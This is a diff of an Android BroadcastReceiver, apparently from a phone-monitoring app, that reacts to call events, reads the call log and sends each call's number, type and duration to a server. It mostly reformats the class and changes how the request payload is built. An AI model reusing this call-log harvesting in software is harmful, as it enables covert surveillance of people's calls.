@@ -1,6 +1,14 @@
 package com.inet.android.call;
 
+import java.util.HashMap;
+import java.util.Map;
 import java.util.concurrent.TimeUnit;
+
+import com.inet.android.request.AppConstants;
+import com.inet.android.request.RequestList;
+import com.inet.android.utils.AppSettings;
+import com.inet.android.utils.ConvertDate;
+import com.inet.android.utils.Logging;
 
 import android.content.BroadcastReceiver;
 import android.content.Context;
@@ -11,13 +19,6 @@ import android.provider.CallLog;
 import android.telephony.TelephonyManager;
 import android.util.Log;
 
-import com.inet.android.request.AppConstants;
-import com.inet.android.request.RequestList;
-import com.inet.android.utils.AppSettings;
-import com.inet.android.utils.ConvertDate;
-import com.inet.android.utils.Logging;
-import com.loopj.android.http.RequestParams;
-
 /**
  * Class get call
  * 
@@ -26,19 +27,16 @@ import com.loopj.android.http.RequestParams;
  */
 public class CallReceiver extends BroadcastReceiver {
 	private Context mContext;
-	private static String LOG_TAG = CallReceiver.class.getSimpleName()
-			.toString();
+	private static String LOG_TAG = CallReceiver.class.getSimpleName().toString();
 	private static int osCheck = 0;
 
 	@Override
 	public void onReceive(Context context, Intent intent) {
 		mContext = context;
-		Logging.doLog(LOG_TAG,
-				"intent: " + intent.getAction() + " " + intent.getExtras(),
+		Logging.doLog(LOG_TAG, "intent: " + intent.getAction() + " " + intent.getExtras(),
 				"intent: " + intent.getAction() + " " + intent.getExtras());
 
-		if (AppSettings.getState(AppConstants.TYPE_INCOMING_CALL_REQUEST,
-				mContext) == 0)
+		if (AppSettings.getState(AppConstants.TYPE_INCOMING_CALL_REQUEST, mContext) == 0)
 			return;
 
 		Bundle bundle = intent.getExtras();
@@ -50,27 +48,21 @@ public class CallReceiver extends BroadcastReceiver {
 			// Incoming call from SIM2
 			Logging.doLog(LOG_TAG, "sim2", "sim2");
 		}
-		if (intent.getAction()
-				.equals("android.intent.action.NEW_OUTGOING_CALL")) {
+		if (intent.getAction().equals("android.intent.action.NEW_OUTGOING_CALL")) {
 			// получаем исходящий номер
 			Logging.doLog(LOG_TAG, "android.intent.action.NEW_OUTGOING_CALL ",
 					"android.intent.action.NEW_OUTGOING_CALL");
 
-		} else if (intent.getAction().equals(
-				"android.intent.action.PHONE_STATE")) {
-			String phoneState = intent
-					.getStringExtra(TelephonyManager.EXTRA_STATE);
-			Logging.doLog(LOG_TAG, "android.intent.action.PHONE_STATE ",
-					"android.intent.action.PHONE_STATE");
+		} else if (intent.getAction().equals("android.intent.action.PHONE_STATE")) {
+			String phoneState = intent.getStringExtra(TelephonyManager.EXTRA_STATE);
+			Logging.doLog(LOG_TAG, "android.intent.action.PHONE_STATE ", "android.intent.action.PHONE_STATE");
 
 			if (phoneState.equals(TelephonyManager.EXTRA_STATE_RINGING)) {
 				// телефон звонит, получаем входящий номер
-				Logging.doLog(LOG_TAG, "EXTRA_STATE_RINGING ",
-						"EXTRA_STATE_RINGING - ");
+				Logging.doLog(LOG_TAG, "EXTRA_STATE_RINGING ", "EXTRA_STATE_RINGING - ");
 
 			} else if (phoneState.equals(TelephonyManager.EXTRA_STATE_OFFHOOK)) {
-				Logging.doLog(LOG_TAG, "TelephonyManager.EXTRA_STATE_OFFHOOK ",
-						"TelephonyManager.EXTRA_STATE_OFFHOOK");
+				Logging.doLog(LOG_TAG, "TelephonyManager.EXTRA_STATE_OFFHOOK ", "TelephonyManager.EXTRA_STATE_OFFHOOK");
 
 				String osVersion = android.os.Build.VERSION.RELEASE;
 				Log.d(LOG_TAG, "android version: " + osVersion);
@@ -135,8 +127,7 @@ public class CallReceiver extends BroadcastReceiver {
 
 	private void getCallDetails() {
 
-		Cursor managedCursor = mContext.getContentResolver().query(
-				CallLog.Calls.CONTENT_URI, null, null, null, null);
+		Cursor managedCursor = mContext.getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, null);
 
 		int number = managedCursor.getColumnIndex(CallLog.Calls.NUMBER);
 		int type = managedCursor.getColumnIndex(CallLog.Calls.TYPE);
@@ -165,15 +156,14 @@ public class CallReceiver extends BroadcastReceiver {
 		}
 
 		managedCursor.close();
+		Map<String, Object> call = new HashMap<String, Object>();
+		Map<String, String> info = new HashMap<String, String>();
+		call.put("type", callTypeStr);
+		call.put("time", ConvertDate.logTime());
+		info.put("number", phNumber);
+		info.put("duration", callDuration);
+		call.put("info", info);
 
-		RequestParams params = new RequestParams();
-		params.put("data[][info][number]", phNumber);
-		params.put("data[][info][duration]", callDuration);
-
-		params.put("data[][time]", ConvertDate.logTime());
-		params.put("data[][type]", callTypeStr);
-		params.put("key", System.currentTimeMillis());
-
-		RequestList.sendDataRequest(params, mContext);
+		RequestList.sendDataRequest(call,  null,mContext);
 	}
 }
